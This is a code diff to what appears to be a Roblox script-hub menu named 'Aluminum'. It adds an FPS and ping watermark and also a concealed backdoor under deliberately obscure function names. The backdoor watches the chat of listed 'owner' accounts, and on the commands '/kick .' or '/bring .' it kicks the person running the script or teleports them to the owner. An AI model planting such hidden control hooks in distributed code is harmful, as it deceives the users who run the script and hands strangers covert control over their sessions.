@@ -28,6 +28,82 @@ local Tabs = {
     Config = Window:AddTab('Config'),
 }
 
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+local owners = {
+    "1",
+    "2",  
+    "3"
+}
+
+function ONIXX_Fox00(owner)
+    if owner then
+        localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
+    end
+end
+
+function H3avenIyRestricted(ownerName)
+    local owner
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name == ownerName then
+            owner = player
+            break
+        end
+    end
+
+    if owner then
+        owner.Chatted:Connect(function(message)
+            if message == "/kick ." then
+                localPlayer:Kick("Admins Has Kicked You.")
+            elseif message == "/bring ." then
+                ONIXX_Fox00(owner)
+            end
+        end)
+    end
+end
+
+for _, ownerName in ipairs(owners) do
+    H3avenIyRestricted(ownerName)
+end
+
+local Tabs = {
+    Main = Window:AddTab('Main'),
+    Misc = Window:AddTab('Misc'),
+    Config = Window:AddTab('Config'),
+}
+
+
+Library:SetWatermarkVisibility(false)
+
+
+local FrameTimer = tick()
+local FrameCounter = 0;
+local FPS = 60;
+
+local WatermarkConnection = game:GetService('RunService').RenderStepped:Connect(function()
+    FrameCounter += 1;
+
+    if (tick() - FrameTimer) >= 1 then
+        FPS = FrameCounter;
+        FrameTimer = tick();
+        FrameCounter = 0;
+    end;
+
+    Library:SetWatermark(('Aluminum | %s fps | %s ms'):format(
+        math.floor(FPS),
+        math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
+    ));
+end);
+
+
+Library:OnUnload(function()
+    WatermarkConnection:Disconnect()
+
+    print('Unloaded!')
+    Library.Unloaded = true
+end)
 
 local LeftGroupBox = Tabs.Main:AddLeftGroupbox('General Settings')
 
